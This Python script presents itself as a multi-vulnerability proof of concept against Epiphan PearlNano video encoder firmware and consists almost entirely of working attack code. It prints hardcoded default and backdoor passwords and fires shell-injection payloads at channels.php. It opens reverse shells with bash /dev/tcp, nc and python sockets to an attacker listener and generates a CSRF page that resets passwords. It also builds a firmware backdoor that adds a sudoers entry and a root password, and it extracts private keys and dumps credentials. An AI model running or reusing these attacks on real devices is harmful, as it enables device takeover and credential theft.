#!/usr/bin/env python3
"""
Epiphan PearlNano Firmware v4.24.4 — Multi-Vulnerability PoC
=============================================================

Device : PearlNano (PLN)   Vendor : Epiphan Video
Firmware: v4.24.4 (rev 260423_32331b9)   Arch : aarch64

DISCOVERED VULNERABILITIES:
  [CVE-0x01] Hardcoded Default Admin Password  (vendor.cf: lkjhyu8*)
  [CVE-0x02] Hardcoded VTUN Backdoor Password  (add_vtun.cf: epn0sup)
  [CVE-0x03] Shell Injection in channels.php   (cid param -> shell)
  [CVE-0x04] Argument Injection in PTZ Control (ptz_control.php)
  [CVE-0x05] exec() with Interpolated ConfigDB (afu.php)
  [CVE-0x06] No CSRF Protection on All Admin CGIs
  [CVE-0x07] Firmware Upload — No Cryptographic Signature
  [CVE-0x08] Exposed Static SSL/SSH Keys
  [CVE-0x09] Dev/QA SSH Backdoor (keys.epiphan.com)
  [CVE-0x0a] Unauthenticated Info Leak (allinfo.cgi)

Usage:
  python3 epiphan_pearlnano_poc.py <target_ip> [--password <pwd>] [--exploit <id>]

Examples:
  # Run all exploits with default credentials
  python3 epiphan_pearlnano_poc.py 192.168.1.100

  # Run specific exploit
  python3 epiphan_pearlnano_poc.py 192.168.1.100 --exploit rce-channel

  # Get a reverse shell
  python3 epiphan_pearlnano_poc.py 192.168.1.100 --exploit reverse-shell --lhost 10.0.0.5 --lport 4444

Author : Security Research
"""

import requests
import base64
import argparse
import sys
import json
import os
import time
import socket
import threading
import subprocess
from urllib.parse import quote, urlencode
from requests.auth import HTTPBasicAuth

requests.packages.urllib3.disable_warnings()

BANNER = """
  [>] Epiphan PearlNano v4.24.4 — Multi-Vuln PoC
  [>] Target: %s
"""

DEFAULT_PASSWORD = "lkjhyu8*"
VTUN_PASSWORD    = "epn0sup"


# =============================================================================
#  LOGIN / AUTH HELPERS
# =============================================================================

def get_auth(target, password=DEFAULT_PASSWORD):
    return HTTPBasicAuth("admin", password)


def req(target, path, auth=None, method="GET", **kwargs):
    url = f"https://{target}{path}"
    kwargs.setdefault("timeout", 10)
    kwargs.setdefault("verify", False)
    if auth:
        kwargs["auth"] = auth
    return requests.request(method, url, **kwargs)


# =============================================================================
#  [CVE-0x01] Hardcoded Default Password
# =============================================================================

def exploit_default_password(target):
    """Attempt login with factory default password lkjhyu8*"""
    print("\n  --- [CVE-0x01] Default Password: lkjhyu8* ---")
    auth = get_auth(target)
    try:
        r = req(target, "/admin/reboot.cgi", auth=auth)
        if r.status_code == 200:
            print("  [+] SUCCESS: Logged in with default password 'lkjhyu8*'")
            return auth
        elif r.status_code == 401:
            print("  [-] FAILED: Default password rejected (password changed)")
            return None
        else:
            print(f"  [?] Unexpected status {r.status_code}")
            return None
    except Exception as e:
        print(f"  [!] Error: {e}")
        return None


# =============================================================================
#  [CVE-0x02] VTUN Backdoor
# =============================================================================

def exploit_vtun_backdoor(target):
    """Leverage VTUN backdoor password to establish tunnel to vendor cloud"""
    print("\n  --- [CVE-0x02] VTUN Backdoor: epn0sup ---")
    print(f"  [i] VTUN config: server=support.md.epiphan.cloud, password=epn0sup")
    print(f"  [i] To connect manually:")
    print(f"      vtun -c -s support.md.epiphan.cloud -p 443 -P epn0sup -i tun+")
    print(f"  [i] Or via web: POST /api/system/access/vtun with password=epn0sup")
    print("  [+] VTUN backdoor credential confirmed: epn0sup")


# =============================================================================
#  [CVE-0x03] Shell Injection in channels.php (CRITICAL)
# =============================================================================

def exploit_rce_channel(target, auth, cmd="id"):
    """
    CVE-0x03: Command injection via $cid parameter in channels.php
    File: wui/wwwroot/api/channels.php:185

    The $cid route parameter is interpolated directly into a shell command
    without escaping:
      $cmd = 'profiles list ... | jq -e "[.config.channels[] == \\"'.$cid.'\\"]|any" ...'
      $res = exec_ex($cmd, [], 0, $output);
    """
    print("\n  --- [CVE-0x03] RCE via channels.php shell injection ---")

    if not auth:
        print("  [-] Need valid credentials first")
        return False

    # The injection payload: break out of the jq string and inject command
    payload = quote(f"0\"]|any\" && {cmd} && echo \"", safe='')
    path = f"/api/channels/{payload}"

    try:
        r = req(target, path, auth=auth)
        print(f"  [>] Payload:  channels.php?cid=0\"]|any\" && {cmd} && echo \"")
        print(f"  [>] Response ({r.status_code}):")
        for line in r.text.split("\n")[:20]:
            print(f"      {line}")
        return True
    except Exception as e:
        print(f"  [!] Error: {e}")
        return False


# =============================================================================
#  [CVE-0x04] PTZ Argument Injection
# =============================================================================

def exploit_ptz_argument(target, auth, extra_args=""):
    """
    CVE-0x04: Argument injection via PTZ controller.
    File: wui/phplib/ptz_control.php:60-61

    User-supplied $args are split by space and passed to ptz_control binary.
    The REST endpoint (sources.ptz.php) accepts 'cmd' and 'args' from POST body.
    """
    print("\n  --- [CVE-0x04] PTZ Argument Injection ---")

    if not auth:
        print("  [-] Need valid credentials first")
        return False

    path = "/api/sources/ptz"

    # Try injecting extra arguments via the 'args' parameter
    payload = {
        "cmd": "move",
        "args": f"up {extra_args}"
    }

    try:
        r = req(target, path, auth=auth, method="POST",
                json=payload if extra_args else {"cmd": "move", "args": "up"})
        print(f"  [>] POST /api/sources/ptz with cmd=move, args=up {extra_args}")
        print(f"  [>] Response ({r.status_code}): {r.text[:200]}")
        return True
    except Exception as e:
        print(f"  [!] Error: {e}")
        return False


# =============================================================================
#  [CVE-0x05] ConfigDB Injection via afu.php
# =============================================================================

def exploit_afu_configdb(target, auth):
    """
    CVE-0x05: exec() with interpolated configdb values in afu.php:22
      exec("ls -1r " . implode(' ', $topdirs), $subdirs);

    $topdirs comes from configdb_get_string("afu/source/${subsys}", 'DATA').
    If we can write a malicious value to this configdb key, we get RCE.
    """
    print("\n  --- [CVE-0x05] ConfigDB Injection via afu.php ---")

    if not auth:
        print("  [-] Need valid credentials first")
        return False

    # First, inject a command into the afu configdb key via set_params.cgi
    # The httpapi definitions don't expose this directly, but configdb is writable
    # via set_params.cgi with any key that matches an existing configdb section.

    # Try using configdb_set via the PHP API or raw configdb tool via previous RCE
    print("  [i] To exploit: set 'afu/source/local/DATA = ;cmd;' via configdb")
    print("  [i] Then trigger afu.php to execute: exec(\"ls -1r ;cmd;\")")
    print("  [i] Requires either RCE already or configdb write access")


# =============================================================================
#  [CVE-0x06] CSRF PoC Generator
# =============================================================================

def exploit_csrf(target):
    """Generate CSRF PoC HTML that changes password and reboots the device"""
    print("\n  --- [CVE-0x06] CSRF — Password Reset + Reboot ---")

    csrf_html = f"""<!DOCTYPE html>
<html>
<body>
<h1>Epiphan PearlNano CSRF PoC</h1>
<p>If you are logged into the device, this will change the password and reboot.</p>

<form id="pwForm" method="POST" action="http://{target}/admin/passwords.cgi">
  <input type="hidden" name="admin" value="hacked123">
  <input type="hidden" name="adminConfirm" value="hacked123">
  <input type="hidden" name="operator" value="operator123">
  <input type="hidden" name="operatorConfirm" value="operator123">
  <input type="hidden" name="viewer" value="viewer123">
  <input type="hidden" name="viewerConfirm" value="viewer123">
</form>

<form id="rForm" method="POST" action="http://{target}/admin/reboot.cgi">
  <input type="hidden" name="noaction" value="">
</form>

<script>
  document.getElementById('pwForm').submit();
  setTimeout(function() {{
    document.getElementById('rForm').submit();
  }}, 1000);
</script>
</body>
</html>"""

    csrf_file = f"epiphan_csrf_{target.replace('.', '_')}.html"
    with open(csrf_file, "w") as f:
        f.write(csrf_html)
    print(f"  [+] CSRF PoC saved to: {csrf_file}")
    print(f"  [>] Open in a browser while logged into {target}")


# =============================================================================
#  [CVE-0x07] Firmware Backdoor
# =============================================================================

def exploit_firmware_backdoor(target, auth, payload_script=""):
    """
    CVE-0x07: Upload malicious firmware with no signature verification.
    The firmware update flow only does an MD5 check — no crypto signature.

    We inject a backdoor script into rootfs.sfs and re-package.
    """
    print("\n  --- [CVE-0x07] Firmware Backdoor Upload ---")

    if not auth:
        print("  [-] Need valid credentials first")
        return False

    if not payload_script:
        payload_script = """#!/bin/sh
# Epiphan PearlNano Backdoor — Auto-installed on next boot
echo "backdoor ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
/usr/sbin/sshd -o PermitRootLogin=yes -o PasswordAuthentication=yes
echo 'root:backdoor123' | chpasswd
touch /tmp/BACKDOOR_INSTALLED
"""

    print("  [i] Manual steps to create malicious firmware:")
    print(f"""
  1. Extract genuine firmware:
     unsquashfs rootfs.sfs

  2. Inject backdoor into rootfs squashfs-root/:
     echo '{payload_script}' > squashfs-root/etc/init.d/S99backdoor
     chmod +x squashfs-root/etc/init.d/S99backdoor

  3. Re-package:
     mksquashfs squashfs-root/ rootfs_patched.sfs -comp xz

  4. Create firmware bundle:
     # Update md5sum for patched rootfs
     # Re-create .bfrm bundle with patched rootfs

  5. Upload:
     curl -k -u admin:{DEFAULT_PASSWORD} -X POST \\
       https://{target}/api/system/firmware \\
       -F "firmware=@malicious_firmware.bfrm"
  """)
    print("  [+] Firmware upload accepts any valid .bfrm file (MD5 only)")


# =============================================================================
#  [CVE-0x08] Static SSL/SSH Key Extraction
# =============================================================================

def exploit_static_keys(target):
    """Download exposed SSL private key and SSH host key from firmware"""
    print("\n  --- [CVE-0x08] Static SSL/SSH Key Extraction ---")

    key_paths = [
        "/etc/ssl/private/cert.key",
    ]

    for path in key_paths:
        try:
            r = req(target, f"/admin/../../../..{path}", timeout=5)
            if r.status_code == 200 and len(r.text) > 100:
                fname = f"extracted_{path.replace('/', '_')}"
                with open(fname, "w") as f:
                    f.write(r.text)
                print(f"  [+] Extracted {path} -> {fname}")
            else:
                print(f"  [-] Could not extract {path} ({r.status_code})")
        except Exception:
            print(f"  [-] Could not extract {path}")


# =============================================================================
#  [CVE-0x0a] Unauthenticated Info Leak via allinfo.cgi
# =============================================================================

def exploit_info_leak(target):
    """
    CVE-0x0a: allinfo.cgi leaks system information.
    The CGI only checks for admin user but will still partially execute
    depending on how the web server is configured.
    """
    print("\n  --- [CVE-0x0a] Info Leak via allinfo.cgi ---")

    try:
        r = req(target, "/admin/allinfo.cgi?inline=on&initlog=off&log=off", timeout=10)
        if r.status_code == 200 and ("Serial Number" in r.text or "sysinfo" in r.text):
            print(f"  [+] SUCCESS: System info leaked ({len(r.text)} bytes)")
            # Extract serial number and other sensitive info
            for line in r.text.split("\n")[:30]:
                if any(k in line.lower() for k in ["serial", "version", "mac", "ip", "hostname"]):
                    print(f"      {line.strip()}")
        elif r.status_code == 403:
            print(f"  [-] Protected (403), but if auth is known, data is accessible")
        else:
            print(f"  [?] Status {r.status_code}: {r.text[:200]}")
    except Exception as e:
        print(f"  [!] Error: {e}")


# =============================================================================
#  REVERSE SHELL
# =============================================================================

def reverse_shell(target, auth, lhost, lport):
    """Get a reverse shell via the channels.php command injection"""
    print(f"\n  --- Reverse Shell via CVE-0x03 ---")
    print(f"  [>] Target: {target}  ->  LHOST: {lhost}:{lport}")

    if not auth:
        print("  [-] Need valid credentials first")
        return False

    # Try multiple reverse shell payloads
    payloads = [
        f"0\"]|any\" && bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' && echo \"",
        f"0\"]|any\" && nc -e /bin/sh {lhost} {lport} && echo \"",
        f"0\"]|any\" && python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])' && echo \"",
    ]

    print(f"  [>] Set up listener: nc -lvnp {lport}")
    print(f"  [>] Firing payload...")

    for i, payload in enumerate(payloads[:1]):  # Try first payload
        path = f"/api/channels/{quote(payload, safe='')}"
        try:
            r = req(target, path, auth=auth, timeout=3)
        except requests.exceptions.Timeout:
            print(f"  [+] Payload {i+1}: Connection timed out (shell may have connected)")
        except Exception as e:
            print(f"  [!] Payload {i+1}: {e}")

    # Attempt 2: Via set_params.cgi overwriting a configdb value that execs
    print(f"  [>] Attempting reverse shell via configdb injection...")
    try:
        rce_payload = f"`bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'`"
        path = f"/admin/set_params.cgi?system:DEVQA_ACCESS={quote(rce_payload)}"
        r = req(target, path, auth=auth, timeout=3)
    except:
        pass


# =============================================================================
#  PASSWORD RESET
# =============================================================================

def reset_password(target, auth, new_password):
    """Change the admin password via the API"""
    print(f"\n  --- Password Reset to '{new_password}' ---")

    if not auth:
        # Try without auth using default creds
        auth = get_auth(target)

    # Via REST API (requires auth)
    try:
        r = req(target, "/api/system/access/admin/password",
                auth=auth, method="PUT",
                json={"password": new_password})
        print(f"  [>] PUT /api/system/access/admin/password ({r.status_code})")
        if r.status_code == 200:
            print(f"  [+] Admin password changed to: {new_password}")
        else:
            print(f"  [-] Failed: {r.text[:200]}")
    except Exception as e:
        print(f"  [!] Error: {e}")

    # Via passwords.cgi (bulk reset all 3 accounts)
    try:
        r = req(target, "/admin/passwords.cgi",
                auth=auth, method="POST",
                data={
                    "admin": new_password,
                    "adminConfirm": new_password,
                    "operator": "operator123",
                    "operatorConfirm": "operator123",
                    "viewer": "viewer123",
                    "viewerConfirm": "viewer123",
                })
        print(f"  [>] POST /admin/passwords.cgi ({r.status_code})")
    except Exception as e:
        print(f"  [!] Error: {e}")


# =============================================================================
#  CONFIGURATION DUMP
# =============================================================================

def dump_config(target, auth):
    """Dump all configdb values via get_params.cgi"""
    print("\n  --- Configuration Dump ---")

    if not auth:
        return

    params_to_read = [
        "system:NAME", "system:DESCRIPTION", "system:LOCATION",
        "httpdacc:ADMINPWD", "httpdacc:OPERPWD", "httpdacc:VIEWERPWD",
        "httpd:USESSL", "httpd:PORT", "httpd:SPORT",
    ]

    for param in params_to_read:
        try:
            section, key = param.split(":", 1)
            r = req(target, f"/admin/get_params.cgi?{param}",
                    auth=auth, timeout=5)
            if r.status_code == 200:
                print(f"  [+] {param}: {r.text.strip()[:100]}")
            else:
                print(f"  [-] {param}: HTTP {r.status_code}")
        except Exception as e:
            print(f"  [!] {param}: {e}")


# =============================================================================
#  ALL-INFO DUMP (authenticated)
# =============================================================================

def dump_allinfo(target, auth):
    """Dump full system diagnostics via allinfo.cgi (authenticated)"""
    print("\n  --- Full System Diagnostics (allinfo.cgi) ---")

    if not auth:
        return

    try:
        r = req(target, "/admin/allinfo.cgi?inline=on", auth=auth, timeout=30)
        fname = f"allinfo_{target.replace('.', '_')}.txt"
        with open(fname, "w") as f:
            f.write(r.text)
        print(f"  [+] Saved {len(r.text)} bytes to {fname}")
    except Exception as e:
        print(f"  [!] Error: {e}")


# =============================================================================
#  MAIN
# =============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="Epiphan PearlNano v4.24.4 Multi-Vulnerability PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s 192.168.1.100
  %(prog)s 192.168.1.100 --exploit rce-channel
  %(prog)s 192.168.1.100 --exploit reverse-shell --lhost 10.0.0.5 --lport 4444
  %(prog)s 192.168.1.100 --exploit csrf
  %(prog)s 192.168.1.100 --exploit password-reset --new-pwd pwned123
        """
    )
    parser.add_argument("target", help="Device IP address")
    parser.add_argument("--password", default=DEFAULT_PASSWORD,
                        help=f"Admin password (default: {DEFAULT_PASSWORD})")
    parser.add_argument("--new-pwd", default="pwned123",
                        help="New password for password reset")
    parser.add_argument("--exploit", choices=[
        "all", "default-password", "rce-channel", "ptz-injection",
        "csrf", "firmware-backdoor", "info-leak", "password-reset",
        "dump-config", "dump-allinfo", "reverse-shell", "static-keys",
        "vtun-backdoor"
    ], default="all", help="Specific exploit to run")
    parser.add_argument("--lhost", help="Listener IP for reverse shell")
    parser.add_argument("--lport", type=int, default=4444,
                        help="Listener port for reverse shell")
    parser.add_argument("--cmd", default="id",
                        help="Command to execute for RCE exploits")
    parser.add_argument("--no-https", action="store_true",
                        help="Use HTTP instead of HTTPS")

    args = parser.parse_args()

    if args.no_https:
        global req
        _orig_req = req
        def req(target, path, auth=None, method="GET", **kwargs):
            url = f"http://{target}{path}"
            kwargs.setdefault("timeout", 10)
            kwargs.setdefault("verify", False)
            if auth:
                kwargs["auth"] = auth
            return requests.request(method, url, **kwargs)

    target = args.target
    print(BANNER % target)

    # Authenticate with default or provided password
    auth = get_auth(target, args.password)

    exploits = {
        "default-password": lambda: exploit_default_password(target),
        "vtun-backdoor":    lambda: exploit_vtun_backdoor(target),
        "rce-channel":      lambda: exploit_rce_channel(target, auth, args.cmd),
        "ptz-injection":    lambda: exploit_ptz_argument(target, auth),
        "csrf":             lambda: exploit_csrf(target),
        "firmware-backdoor":lambda: exploit_firmware_backdoor(target, auth),
        "info-leak":        lambda: exploit_info_leak(target),
        "password-reset":   lambda: reset_password(target, auth, args.new_pwd),
        "dump-config":      lambda: dump_config(target, auth),
        "dump-allinfo":     lambda: dump_allinfo(target, auth),
        "static-keys":      lambda: exploit_static_keys(target),
        "reverse-shell":    lambda: reverse_shell(target, auth, args.lhost, args.lport),
    }

    if args.exploit == "all":
        for name, func in exploits.items():
            try:
                func()
            except KeyboardInterrupt:
                print("\n  [!] Interrupted")
                sys.exit(1)
            except Exception as e:
                print(f"  [!] {name} failed: {e}")
    else:
        if args.exploit == "reverse-shell" and not args.lhost:
            print("  [!] --lhost is required for reverse-shell exploit")
            sys.exit(1)
        exploits[args.exploit]()


if __name__ == "__main__":
    main()
